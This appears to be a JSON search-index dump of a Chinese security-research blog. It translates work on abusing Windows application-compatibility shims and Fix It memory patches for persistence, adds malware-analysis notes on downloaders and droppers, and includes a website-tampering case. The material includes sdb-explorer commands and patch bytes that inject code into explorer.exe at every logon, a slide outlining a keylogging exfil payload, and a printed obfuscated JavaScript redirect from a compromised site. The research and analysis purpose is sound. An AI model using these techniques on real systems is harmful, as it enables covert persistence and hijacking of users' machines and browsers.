别指望这些会改变 . 用这个建立一个白名单！ . shims_hash_shims.py\n为这种情况做好准备 . https://github.com/ganboing/sdb_packer . 提取现有合法的sysmain.sdb . 为explorer.exe等添加新的垫片。 . 有效载荷：执行exfil的keylog数据和shellcode代码 . 重新打包sysmain.sdb . 部署 . ？？？ . 受益\n垫片是真的。不要被绊倒 . 目标威胁和商品威胁都在积极使用ACI垫片 . 没有现有的检测基础设施 . 考虑风险\n. 你现在是第一线。\n前期工作 “Persist It - Using and Abusing Microsoft Fix It Patches” - Jon Erickson/iSIGHT@ BH ’14 “Shim: A new method of injection” (in Russian) “Roaming Tiger” - Anton Cherepanov/ESET @ ZeroNights ’14 “Windows - Owned By Default!” – Mark Baggett @ DerbyCon 2013 “Compatibility Fix Descriptions” - MSDN\n参考链接 ",
    "description": "",
    "tags": "样本分析拓展",
    "title": "真正的垫片黑幕",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8B%93%E5%B1%95/%E7%9C%9F%E6%AD%A3%E7%9A%84%E5%9E%AB%E7%89%87%E9%BB%91%E5%B9%95-/index.html"
  },
  {
    "content": "背景介绍 在《Malware Analysis》的翻译过程中，8.4.3使用Shim进行内存修补这一节中，作者提到了有关shim或windows打补丁的过程性研究的两篇文章，Jon Erickson的《Using and Abusing Microsoft’s Fix It Patches》和William Ballenthin、Jonathan Tomczak的《The Real Shim Shady》两篇文章。本文就是针对《Using and Abusing Microsoft’s Fix It Patches》的翻译及研究记录。\n正文翻译 摘要 Microsoft经常使用Fix it修补程序，这是应用程序兼容性修补程序的一个子集，作为阻止新发现的针对其产品的主动利用方法的一种方式。用于防止攻击的常见修复修补程序类型是以前未记录的内存修复修补程序。本研究首先重点分析了这些内存补丁。通过从中提取信息，研究人员能够更好地理解微软打算修补的漏洞。然后，研究的重点是对补丁进行逆向工程，并使用这些信息来提供创建补丁的能力，这些补丁可用于维护系统的持久性。\n导言 微软的应用程序兼容性组合最初只是为了允许过时的软件在较新的操作系统上运行而设计的。在XP版本中，微软提供了一个包含200个应用程序兼容性修复的数据库。高级用户能够使用兼容性管理工具来选择特定的程序或可执行文件，然后应用这200个可用修复程序中的任何一个。这将导致自定义数据库为该程序修复它。多年来，应用程序兼容性修补程序的效用已经发展到能够通过使用内存修补程序修补程序来修补安全漏洞，该修补程序不包括在兼容性管理工具的可用修补程序列表中。(Microsoft Corporation,2001)\n虽然微软允许使用现有的修复程序，但他们明确禁止创建新的修复程序，并表示，“这种限制是有意的，旨在降低允许非微软方在加载过程中注入潜在有害代码对系统安全造成的风险。”这项研究表明，通过使用未记录的内存修复它，完全可以做到这一点。\n在讨论了之前的工作之后，我们将提供关于应用程序兼容性修复如何工作的背景信息。然后，我们将展示Windows Loader进程如何使用它们。在了解它们是什么以及如何使用它们之后，我们将分解并分析Microsoft如何使用内存修复它来修补Internet Explorer中的漏洞。然后，我们将介绍一个工具来分析这些修复its，并允许创建支持持久性的补丁。\n前期工作 前期工作 如前所述，Fix It文件的内存补丁功能没有文档记录。亚历克斯·约内斯库是第一批对修复补丁进行研究的人之一。在约内斯库关于修复补丁的博客上，他说：“补丁是通过一种方法完成的，这种方法将在以后更详细地研究。”（约内斯库， 应用程序兼容性数据库的秘密（SDB）-第3部分，2007）虽然他可能理解这种格式，但他从未发布过关于补丁或查看补丁的工具的博客帖子。缺乏来自微软和研究的公开信息产生了执行分析和恢复这种补丁结构的愿望。\nMark Barggett介绍了“Windows是默认拥有的！”在2013年德比大会上。（Baggett，2013）他的演讲描述了用户空间rootkit的工作方式，并展示了rootkit作者创建的大多数东西是如何内置到Windows操作系统中的，并且可以通过使用应用程序兼容性工具包来访问。他展示了如何使用这个工具创建不同的shim数据库文件来维护系统的持久性。Application Compatibility Toolkit没有为用户提供创建内存补丁修补程序的能力，也没有提供分析它们的能力，而这正是本研究的重点。Baggett还指出，您可以通过查看控制面板的Add Remove programs部分来识别通过Microsoft提供的sdbinst程序安装的shim数据库。本研究使用了另一种安装方法，但无法通过添加、删除程序对话框识别该方法。\n应用程序兼容性背景 应用程序兼容性修复解决了应用程序之间的兼容性问题及其与Windows的交互方式。修复it解决方案中心是一个专门修复Its的微软网站，允许用户选择他们的问题领域，如Windows、Internet Explorer、Office等。然后选择问题类型，可以是从性能到安全相关的任何问题。然后，该网站提供了一个可能的解决方案列表。这些解决方案以填充数据库（SDB）的形式发布。\n安装填充程序数据库后，它们将在注册表中的以下两个位置注册：\nHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB 例如，微软发布了一个修复补丁，以防止主动利用CVE-2012-1889。（Microsoft，2012）安装此修补程序会创建两个密钥。它首先用目标可执行文件的名称在Custom下创建一个键，在本例中是iexplore.exe。在这个键下，它创建一个名为{91d42a30-5434-48bc-9620-c00936f38898}。然后，修复修补程序会在InstalledSDB中创建一个名为{91d42a30-5434-48bc-9620-c00936f38898}的密钥。此键包含以下值：\nDatabaseDescription=MSXML5:CVE-2012-1889\rDatabaseInstallTimeStamp=0x1ceab108adaac2c\rDatabasePath=C:\\Windows\\AppPatch\\Custom\\{91d42a30-5434-48bc-9620-c00936f38898}.sdb\rDatabaseType=0x10000\r通过查看DatabasePath值可以看到，SDB文件被复制到C:\\Windows\\AppPatch\\Custom目录中。该目录用于存储32位应用程序的SDB文件。 如果为64位应用程序安装补丁，那么SDB文件将位于C:\\Windows\\AppPatch\\Custom\\Custom64目录中。并不要求SDB文件位于这些目录中，这只是微软使用的一种惯例。SDB文件可以位于任何可访问的目录位置，并且可以使用任何文件名。甚至有可能有不同文件扩展名的SDB文件。对目录位置的唯一警告是针对64位应用程序。如果是64位应用程序，SDB文件的目录路径中必须有Custom64。DatabaseType值0x10000表示数据库包含要填充的条目。(微软，2012)\n有两种已知的工具可以对SDB文件执行分析。首先是CDD兼容性数据库转储程序，它不对公众开放（约内斯库，应用程序兼容性数据库的秘密（SDB）-第1部分，2007）。第二个是将数据库填充到XML，sdb2xml.exe，这是一个由微软员工创建的工具（Stewart，2007）。sdb2xml在开始这项研究时提供了有用的信息。微软还提供了应用程序兼容性工具包，允许开发人员创建sdb文件，但是，该工具不能解析或理解包含补丁条目的sdb文件。微软还提供了一个读写SDB文件的API。（Microsoft，2013）此API不完整，并且不提供对内存修补程序修复它的洞察，但是，此API用于创建新的和读取现有的SDB文件。\n装载机 Windows加载程序用于将进程加载到内存中并开始执行。作为此过程的一部分，加载程序查看特定的应用程序兼容性注册表位置，以查看该进程是否需要任何修补程序。然后，加载程序在修补程序内部查找更具体的指令，例如将修补程序用于哪个版本的应用程序。这被称为匹配步骤。本研究中作为示例使用的特定补丁包含各种Internet Explorer（IE）版本号和语言标识符。根据操作系统语言和IE版本，将应用补丁的特定部分。 以下代码路径用于将修补程序应用于进程内存空间中加载的映像。加载程序代码从apphelp.dll获取SE_DllLoaded函数的地址，然后尝试应用修补程序。\nntdll.dll\rLdrpInitializeProcess()-\u003eLdrpLoadShimEngine()-\u003eLdrpLoadDll()-\u003eSE_DllLoaded()\rapphelp.dll\rSE_DllLoaded()-\u003ePatchNewModules()-\u003eSeiAttemptPatches()-\u003eSeiApplyPatch()\rSeiApplyPatch函数将在后面的修补程序格式部分中讨论。\n补丁分析 本研究中使用了CVE-2013-3393的修复程序，并将在本文的其余部分用作示例。 对于此修复程序，Microsoft提供了mshtml.dll中更改的说明信息，显示了应用修复程序前后的目标函数。(Sikka,2013)。由此，可以看出修复程序做了两处更改，在CDoc::SetMouseCapture方法中引入了新的逻辑。\n了解目标映像在应用修复之前和之后的内存差异，可以进一步了解Fix it补丁的文件格式。\n确定修补程序对特定映像做了什么的快速方法是使用\"!chkimg\"Windbg的扩展。（Microsoft，2013）通过使用-d选项！chkimg扩展将显示当前加载的内存映像与Microsoft符号存储中已知良好版本之间的任何“损坏”（差异）的摘要。 在mshtml.dll版本为10.0.9200.16686的系统上运行此命令。那个！chkimg-d mshtml命令将产生以下输出。\n在安装补丁之前：\r0:021\u003e！chkimg -d mshtml\r0个错误：mshtml\r修复补丁后：\r0:019\u003e！chkimg-d mshtml\r5dc0a5af-5dc0a5b1 3字节-MSHTML!CDoc::SetMouseCapture+3e\r[94 dd 38:04 41 b6] 3个错误：mshtml(5dc0a5af-5dc0a5b1)\r上面的输出显示，当安装修复补丁时，有一个三字节的损坏。应该是94 dd 38的现在是04 41 b6，这些字节用粗体显示在下面。chkimg命令没有检测到第二个损坏。这很可能是由于在图像的原始大小之外添加了额外的代码。上面的三个字节损坏说明了下面的指令更改。\n从：\r5dc0a5ad 0f8594dd3800 jne MSHTML！CDoc::SetMouseCapture+0x4b (5df98347) 改为：\r5dc0a5ad 0f850441b600 jne MSHTML！SZ_HTMLNAMESPACE+0xf(5e76e6b7) 这与Sikka对补丁的描述相符。现在我们知道了应用补丁的代码路径以及补丁如何影响内存中的映像，我们可以直接从sdb文件中提取补丁信息。\n补丁格式 可以使用sdb2xml工具将sdb文件转储为可读的xml格式。但是，对于描述内存修补的修补程序条目，该工具将显示base64编码的字符串或输出包含字节的二进制文件。请参见图1查看与mshtml.dll版本10.0.9200.16686的CVE-2013-3393相关的字节。 （图形1-补丁字节样本）（图形2-C结构描述补片字节） 图形 2 - C 结构 描述 补片 字节图形 1 - 样品 字节 从 补片\n通过结合我们从图像损坏分析中获得的知识，并通过反转SeiApplyPatch函数，我们可以构建一个C结构来帮助我们以有意义的方式理解这些补丁字节，请参见图2。\nSeiApplyPatch函数的伪代码是：\nSeiApplyPatch(PPATCHBITS pb)\r{ while(1)\r{ if (pb-\u003eopcpde==PATCH_MATCH) {\rif (memcmp(pb-\u003epattern，modulebase+rva，pb-\u003epatternSize)!=0)\rreturn 0;\r} else if (pb-\u003eopcode==PATCH_REPLACE)\r{\rNtProtectVirtualMemory(-1,modulebase+rva,pb-\u003epatternSize,PAGE_READWRITE,\u0026old);\rmemcpy(modulebase+rva，pb-\u003epattern，pb-\u003epatternSize)；\rNtProtectVirtualMemory(-1，modulebase+rva，pb-\u003epatternSize，old，\u0026old）；\rFlushInstructionCache(-1，modulebase+rva，pb-\u003epatternSize)； } else\rreturn 1； //转到下一个命令 pb=(PPATCHBITS)((PBYTE)pb+pb-\u003eactionSize); }\r}有两个可能的命令，Match和Replace。匹配操作在模块中指定的相对虚拟地址（RVA）处搜索模式。RVA来自指定的模块基址。如果找不到该模式，修补过程将停止。替换操作将模式写入指定RVA处的模块。这是通过使目标页具有读/写权限、将模式写入目标位置、恢复原始权限以及刷新指令缓存来实现的。\n只有一个地方我发现我不能写，SeiApplyPatch函数本身。程序会崩溃，因为当它试图自我修补时。它将更改自身的读/写权限，这意味着它不能再执行。\nsdb-exeplorer 现有的检查sdb文件的工具不具备以有用的方式解析补丁信息的能力；这促使我开发sdb-exeplorer。\n该工具的当前版本具有以下功能：\n打印完整的sdb树 sdb-explorer.exe -t 文件名.sdb打印修补程序详细信息 sdb-explorer.exe[-i]-p filename.sdb(patch patchid patchref patchbin) -i -创建IDAPython脚本（可选） 打印校验和的修补程序详细信息 sdb-explorer.exe [-i] -s filename.sdb\r创建包含泄漏内存的文件 sdb-explorer.exe -l 文件名.sdb打印匹配项 sdb-explorer.exe -d 文件名.sdb从文件创建修补程序 sdb-explorer.exe -c config.dat [-o filename.sdb] 注册sdb文件 sdb-explorer.exe -r filename.sdb [-a application.exe] 显示用法\rsdb-explorer.exe -h 使用’-t’命令行参数，它将打印完整的sdb树。这可以根据sdb文件的大小产生大量输出。最好将此命令的输出重定向到一个文件，以便可以在文本编辑器中查看。图3显示了检查CVE-2013- 3893的修复补丁的部分输出。 图3-t选项的输出。\n“-d”命令打印sdb文件中的所有匹配项。该命令将生成所有目标模块的列表、它们的版本号以及相关的校验和。\n图4–D选项的输出\n图4显示了CVE-2013-3893的相同修复结果。正如您在下面看到的，我们只显示了这个命令的结果的子集。这个子集包括10个目标，它们都是针对IE版本6.0.3790.5208的。然而，它们有不同的校验和，这是为了覆盖同一版本的不同语言版本。\n要打印出特定补丁的详细信息，您可以使用’-s’或’-p’选项。\n图5-s选项的输出 上面的图5使用了’-s’选项，显示了从IE 6匹配中打印列表中第一个校验和的补丁细节时的输出。输出显示存储在补丁中的二进制blob和解码内容。解码内容的含义与本文补丁分析部分讨论的含义相同。\n图6-补丁和校验和标记\n还可以使用-p选项，使用户能够指定patch、patchbits、patchref、patch_tag_id或校验和，如图6所示。\n这两个选项中的任何一个都可以与’-i’选项一起使用，以生成一个IDA python脚本，该脚本可以在IDA中运行，以修补当前正在分析的文件。图7显示了针对CVE2014-0322的Fix It补丁运行时的情况。\n图7-IDAPython脚本\n其他三个命令：Create Patch、Register Patch和print leaked data，将在后面的章节中讨论。\n​\n信息泄露 我在弄清楚补丁位结构时遇到的一件有趣的事情是，模块名称字段包含垃圾数据。一开始我以为这些数据可能是一些保留的或特殊的未记录的标志。进一步研究后，我确定结构中的module name字段是64字节的固定大小。当模块名占用少于64个字节时，其余部分包含未初始化的堆栈数据。使用带有-l标志的sdb-explorer，它将遍历SDB文件中的每个补丁位条目，并创建一个包含所有泄漏数据的新文件。我认为，如果微软用来创建这些补丁文件的工具在堆栈上留下一些秘密数据，那就太好了，但在我的测试中，情况并非如此。无论哪种方式，标志都在sdb-explorer工具中，供任何人使用。当使用sdb-explorer工具创建修补程序时，模块名称字段首先被初始化为零，以防止数据泄漏。\n持久性 Mark Baggett展示了许多可以使用应用程序兼容性工具包来维护持久性的方法。需要注意的一点是，您必须拥有系统的管理员权限，因为所需的注册表项在HKEY_LOCAL_MACHINE中。 本研究展示了如何使用内存补丁功能来提供持久性。通常，内存补丁允许将任意代码注入进程。 使用内存修复修补程序使得攻击者能够让加载程序执行内存修补程序。此修补程序可用于防止Microsoft预期使用的漏洞，也可用于维护持久性。为了保持系统的持久性，我们将重点放在explorer.exe进程上。每次登录到Windows系统时，都会自动启动此过程。利用这些知识，我们可以创建一个针对explorer.exe进程的内存修补程序，将攻击者的代码注入explorer.exe进程的内存空间。\n图8-修补前的explorer.exe main 图8显示了explorer.exe进程的主要功能。Explorer.exe编译时启用了热修补程序。这可以通过使用“mov edi，edi”指令来识别，该指令前面有5个NOP指令。对于我们来说，这显然是一个修补主函数的地方，以便将附加功能注入到explorer.exe进程中。没有为进程启用热修补的要求，这只是为了方便。 在这种情况下，explorer.exe的模块基址是0x400000，NOP指令从地址0x418408开始。这意味着该区域的RVA为0x18408。我们可以创建一个替换命令 这将转到RVA 0x18408，并用以下字节替换内容：e8 f3 f5 0d 00 eb f9。 图9显示了应用补丁后main函数的新行为。 图9-explorer.exe主补丁后 这段代码现在调用一个新函数，该函数被添加到可执行内存空间的末尾。演示中使用的确切代码在本文末尾的配置文件中。演示代码执行calc.exe进程，并返回explorer.exe中的主函数继续。虽然执行calc可能没有用，但可以用任意代码替换此代码。每次资源管理器.exe运行时都会执行此操作，这是在系统登录时以及每次打开新的资源管理器窗口时执行的。本文末尾的配置文件中有一个示例补丁，可以在explorer.exe的多个版本上执行calc。 要从配置文件创建此sdb文件，请运行以下命令： sdb-explore.exe-c config.dat-o output.sdb 然后可以使用以下命令安装新数据库： sdb-explore.exe-r output.sdb-a explorer.exe\n注册shim数据库将创建所需的两个注册表项，如背景部分所述。您必须以管理员权限运行此命令。也可以使用Microsoft的sdbinst程序注册sdb文件，但是如前所述，这会在添加/删除程序对话框中创建一个条目。 应用程序兼容性的使用潜在地提供了在系统上维护持久性的其他方法，除了上面提到的两种方法，Mark Baggett给出了一个概述和许多可用于维护持久性的兼容性修复示例。 Microsoft Windows Sysinternals中的自动运行实用程序包括关于启动位置的最全面的知识。（Mark Russinovich，2013）目前，Autoruns实用程序不寻找应用程序兼容性修复程序作为Autoruns的可能位置。\n结论 Microsoft的Fix it修补程序提供了大量用于应用程序兼容性和防止安全利用的功能。这项研究表明，以前没有记录的内存补丁通常被微软使用。从这项研究中获得的知识允许创建一个工具来对包含内存补丁的sdb文件进行分析。有了这方面的知识，用户现在就可以创建自己的自定义内存修补程序， 可用于维护系统上的持久性。目前，微软的自动运行工具不认为应用程序兼容性是自动运行的潜在目标。虽然sdb数据库的安装需要管理员权限，但我们认为Microsoft应该为sdb文件格式添加签名支持，并提供一个选项，只允许加载已由已知来源签名的应用程序兼容性修复程序，或者提供一个通知，说明应用程序即将从未签名的数据库修补程序中进行修补。\n文章引用 M.巴格特（2013年2月23日）。2013年员额和出版物。检索于2013年10月23日，来自深度防御：http://www.indepthdefense.com/2013/02/2013-posts-and-publications.html\n约内斯库（2007年5月20日）。应用程序兼容性数据库的秘密（SDB）-第1部分。2013年9月5日，摘自Alex Ionescu的博客：http://www.alex-ionescu.com/？p=39\n约内斯库（2007年5月26日）。应用程序兼容性数据库的秘密（SDB）-第3部分。2013年9月5日，摘自Alex Ionescu的博客：http://www.alex-ionescu.com/？p=41\n马克·鲁西诺维奇（2013年8月1日）。Windows v11.70的自动运行检索于2013年9月5日，来自Windows Sysinternals：http://technet.microsoft.com/en-us/Sysinternals/bb963902.aspx\n微软。（二零一三年九月六日）。！chkimg。检索于2013年10月2日，来自Dev Center：http://msdn.microsoft.com/en-us/library/windows/hardware/ff562217%28v=vs.85%29.aspx\n微软。（二零一三年十月一日）。应用程序兼容性数据库。检索于2013年10月23日，来自Microsoft Developer Network：http://msdn.microsoft.com/library/bb432182.aspx\n微软公司。（2001年6月1日）。Windows XP应用程序兼容性技术。检索于2013年11月8日，来自TechNet：http://technet.microsoft.com/en-us/library/bb457032.aspx\n微软。(2013).修复it解决方案中心。从Microsoft Support检索到2013年的消息：http://support.microsoft.com/fixit/\n微软。（二零一二年十月一日）。Microsoft安全警告：Microsoft XML核心服务中存在允许远程代码执行的漏洞。检索于2013年9月5日，来自Microsoft支持：http://support.microsoft.com/kb/2719615\n微软。（二零一二年十二月七日）。填充数据库类型。检索于2013年9月5日，来自Microsoft Developer Network：http://msdn.microsoft.com/en-us/library/bb432483%28v=vs.85%29.aspx\n新泽西州西卡（2013年9月17日）。CVE-2013-3893：修复它的解决方法可用。检索于2013年10月2日，来自Security Research\u0026Defense：http://blogs.technet.com/b/srd/archive/2013/09/17/CVE-2013-3893-fix-it-workaround-available.aspx\n斯图尔特（2007年11月3日）。将数据库填充到XML。检索于2013年9月5日，Heath Stewart的Setup\u0026Install：http://blogs.msdn.com/b/heaths/archive/2007/11/02/sdb2xml.aspx 用于修补explorer.exe以在启动时运行calc.exe的配置文件。\n参考文章 持续使用和滥用微软的补丁\n",
    "description": "",
    "tags": "样本分析拓展",
    "title": "使用和滥用Microsoft的Fix It修补程序",
    "uri": "/%E6%81%B6%E6%84%8F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8B%93%E5%B1%95/%E4%BD%BF%E7%94%A8%E5%92%8C%E6%BB%A5%E7%94%A8Microsoft%E7%9A%84FixIt%E4%BF%AE%E8%A1%A5%E7%A8%8B%E5%BA%8F/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - python,twitterapi",
    "uri": "/tags/pythontwitterapi/index.html"
  },
  {
    "content": "TwitterTimelineClientScript This is a script to get Twitter Timeline Client from user or userfile.\n项目地址：https://github.com/x7peeps/TwitterTimelineClientScript\nKey Features 指定twitter username或者包含username行的file ，查看最近的推文信息 指定目录输出到文件csv 每次执行日志备份 自定义查看的推文限制 导出成表格 Getting Started git clone git@github.com:x7peeps/TwitterTimelineClientScript.git cd TwitterTimelineClientScript pip3 install -r requestments.txt 编辑TwitterTimelineClientScript.py中的twitter API key python3 TwitterTimelineClientScript.py -h Usage usage: TwitterTimelineClientScript.py [-h] [-f /yourpath/twitter_name_file.txt] [-u elonmusk] [-l 5] [-o /yourpath/twitter_results_output.csv] Twitter Api for read twitters.by x7peeps.com community v0.1 optional arguments: -h, --help show this help message and exit -f /yourpath/twitter_name_file.txt, --filepath /yourpath/twitter_name_file.txt 读取文件中的username -u elonmusk, --username elonmusk 指定一个username查询twitter信息 -l 5, --limit 5 限制查询的数量 -o /yourpath/twitter_results_output.csv, --output /yourpath/twitter_results_output.csv 当使用-f批量查询的时候，可以指定一个导出路径 ",
    "description": "",
    "tags": "python,twitterapi",
    "title": "一个本地命令行查询/批量查询twitter推文的脚本",
    "uri": "/%E5%B7%A5%E5%85%B7/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E5%B7%A5%E5%85%B7/twitter%E4%BF%A1%E6%81%AF%E6%9F%A5%E8%AF%A2%E5%B7%A5%E5%85%B7/TwitterTimelineClientScript/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "威胁情报工具",
    "uri": "/%E5%B7%A5%E5%85%B7/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E5%B7%A5%E5%85%B7/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "工具",
    "uri": "/%E5%B7%A5%E5%85%B7/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "红蓝对抗",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 红蓝对抗,页面篡改",
    "uri": "/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "页面篡改分析",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/index.html"
  },
  {
    "content": "在本样本实例中，我们发现篡改的页面出现的情况与以往的都不同，原因在于不同ua服务器返回的信息不同，甚至出现了疑似流量转发的少见的情况。\n现象： 收到事件线索，客户某网站在打开的时候出现了跳转游戏网站的现象，并且可以复现。通过描述可以确定篡改一定存在。下面需要本地复现一下看看情况。\n跳转的情况总结有2种，一种是服务器无返回，之后直接出现菠菜网站请求响应；大概出现了3-6次的这种情况。\n第二种是匹配到AppleWebKit 也就是移动端UA及MAC端返回跳转脚本导致跳转。并且返回包设置缓存1天，Cache-Control: max-age=86400，导致不清缓存的情况下会出现不断出现跳转现象。\nHTTP/1.0 200 OK Content-Type: text/html Content-Length: 511 Cache-Control: max-age=86400 Connection: close \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e\u003c/head\u003e \u003cbody\u003e \u003cscript type=\"text/javascript\"\u003e function uIYQU(a) { var c = [82, 36, 205, 167, 244, 156, 81, 238]; var b = \"\"; for (var i = 0; i \u003c a.length; i++) { var k = c[i % c.length]; b += String.fromCharCode(a[i] ^ k); } return b; } var u = uIYQU([58, 80, 185, 215, 135, 166, 126, 193, 57, 79, 169, 193, 204, 178, 50, 129, 63, 11]); var ua = navigator.userAgent.toLowerCase(); if (ua.indexOf(\"applewebkit\") \u003e 0) { location.replace(u) } else { var e = document.createElement(\"a\"); e.href = u; document.body.appendChild(e); e.click() }; \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e uIYQU(a)为自定义解密函数，[58, 80, 185, 215, 135, 166, 126, 193, 57, 79, 169, 193, 204, 178, 50, 129, 63, 11]为密文。\n",
    "description": "",
    "tags": "红蓝对抗,页面篡改",
    "title": "页面篡改分析-服务器端重定向跳转",
    "uri": "/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90/%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E5%88%86%E6%9E%90-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E9%87%8D%E5%AE%9A%E5%90%91%E8%B7%B3%E8%BD%AC/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "0x06取证辅助工具",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x06%E5%8F%96%E8%AF%81%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7/index.html"
  },
  {
    "content": "EmergencyRocketPackage Emergency Rocket Package 应急响应火箭包\n项目目标： 收集和汇总应急响应实用的工具包，作为一线实战快速响应工具包，应急响应火箭包\n日常维护包括：\n汇总和测试日常最新的应急响应工具 更新应急响应工具包 项目地址 https://github.com/DFrZ9K4RRay/EmergencyRocketPackage\n",
    "description": "",
    "tags": "应急响应",
    "title": "EmergencyRocketPackage",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x06%E5%8F%96%E8%AF%81%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%B7%A5%E5%85%B7%E7%AE%B1EmergencyRocketPackage/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - python,爬虫",
    "uri": "/tags/python%E7%88%AC%E8%99%AB/index.html"
  },
  {
    "content": "Summary rss2dingtalk是一个简单的用于同步rss订阅资讯到钉钉群机器人的脚本。常用于团队日常订阅资讯使用。\nGetting Started Prerequisites 操作系统: macOS, Linux, Windows 具备的开发环境：python3.X Usage pip3 install -r requirements.txt；\n打开rss.py, 将钉钉机器人的自定义webhook以及seccode填写到rss.py中； 维护rss.db，将需要订阅的rss资源填写到rss表项中即可； 项目地址 https://github.com/x7peeps/Rss2Dingtalk-LTS\n",
    "description": "",
    "tags": "python,爬虫",
    "title": "一个rss订阅到钉钉的脚本rss2dingtalk",
    "uri": "/%E5%B7%A5%E5%85%B7/%E5%A8%81%E8%83%81%E6%83%85%E6%8A%A5%E5%B7%A5%E5%85%B7/rss%E8%AE%A2%E9%98%85%E5%B7%A5%E5%85%B7/rss2dingtalk/index.html"
  },
  {
    "content": "",
    "description": "",
    "tags": null,
    "title": "Tag - 应急响应",
    "uri": "/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/index.html"
  },
  {
    "content": "7. 恶意软件的功能和持久化 恶意软件可以进行各种操作，它可以包括各种功能。了解一个恶意软件所做的事情和它所表现出来的行为，对于理解恶意二进制文件的性质和目的至关重要。在过去的几章中，你学到了进行恶意软件分析所需的技能和工具。在本章和接下来的几章中，我们将主要侧重于了解不同的恶意软件行为、它们的特点和能力。\n1. 恶意软件的功能 现在，你应该对恶意软件如何利用API函数与系统互动有了了解。在本节中，您将了解恶意软件如何利用各种API函数来实现某些功能。关于在哪里可以找到关于特定API的帮助以及如何阅读API文档的信息，请参阅第5章 “使用IDA进行反汇编 “中的第3节 “反汇编Windows API”。\n1.1 下载器 在恶意软件分析中，你会遇到的最简单的恶意软件类型是下载器。下载器是一个从互联网下载另一个恶意软件组件并在系统上执行的程序。它通过调用UrlDownloadToFile()API，将文件下载到磁盘上。一旦下载，它就会使用ShellExecute()、WinExec()或CreateProcess()API调用来执行下载的组件。通常情况下，你会发现下载器被用作攻击壳代码的一部分。\n下面的截图显示了一个32位的恶意软件下载器使用UrlDownloadToFileA()和ShellExecuteA()来下载和执行一个恶意软件二进制。为了确定正在下载恶意软件二进制文件的URL，在调用UrlDownloadToFileA()时设置了一个断点。运行代码后，断点被触发，如以下截图所示。UrlDownloadToFileA()的第二个参数显示将下载恶意软件可执行文件（wowreg32.exe）的URL，第三个参数指定下载的可执行文件在磁盘上的位置。在这种情况下，下载器将下载的可执行文件保存在%TEMP%目录下，称为temp.exe。\n将恶意软件的可执行文件下载到%TEMP%目录后，下载者通过调用ShellExecuteA()API来执行它，如下面的截图所示。另外，恶意软件也可以使用WinExec()或CreateProcess()API来执行下载的文件。\n在调试恶意二进制文件时，最好是运行监控工具 (如Wireshark）和模拟工具（如InetSim），这样你就可以 观察恶意软件的行动并捕获其产生的流量。\n1.2 释放器 Dropper是一个将额外的恶意软件组件嵌入自身的程序。当执行时，下载器会提取恶意软件组件并将其下载到磁盘。下拉程序 通常在资源部分嵌入额外的二进制文件。为了提取嵌入的 为了提取嵌入的可执行文件，投放器使用FindResource(), LoadResource(), LockResource()和 SizeOfResource()的API调用。在下面的截图中，Resource Hacker工具（在第2章静态分析中涉及到 第2章，静态分析）显示了一个PE文件在恶意软件样本的资源部分的存在。 恶意软件样本的资源部分存在一个PE文件。在这种情况下，资源类型是一个DLL。\n在x64dbg中加载恶意二进制文件并查看对API调用的引用（在前一章中涉及），显示对资源相关API调用的引用。这是恶意软件从资源部分提取内容的一个迹象。在这一点上，你可以在调用FindResourceA()API的地址上设置一个断点，如图所示。\n在下面的截图中，运行程序后，由于上一步设置的断点，执行在FindResourceA()API处暂停。传递给FindResourceA()API的第二和第三个参数告诉你，该恶意软件正试图找到DLL/101资源，如下所示。\n在执行FindResourceA()后，其返回值（存储在EAX中），即指定资源信息块的句柄，被作为第二个参数传递给LoadResource()API。LoadResource()检索与该资源相关的数据的句柄。LoadResource()的返回值包含检索到的句柄，然后作为参数传递给LockResource()API，后者获得实际资源的指针。在下面的截图中，调用LockResource()后，执行立即暂停。检查转储窗口中的返回值（存储在EAX中），显示了从资源部分检索到的PE可执行内容。\n一旦它检索到资源，恶意软件使用SizeofResource()API确定资源（PE文件）的大小。接下来，恶意软件使用CreateFileA在磁盘上投放了一个DLL，如下所示。\n然后使用 WriteFile() API 将提取的 PE 内容写入 DLL。在下面的截图中，第一个参数0x5c是DLL的句柄，第二个参数0x00404060是检索到的资源（PE文件）的地址，第三个参数0x1c00是资源的大小，这是用调用SizeOfResource()确定的。\n1.2.1 逆向64位dropper释放器 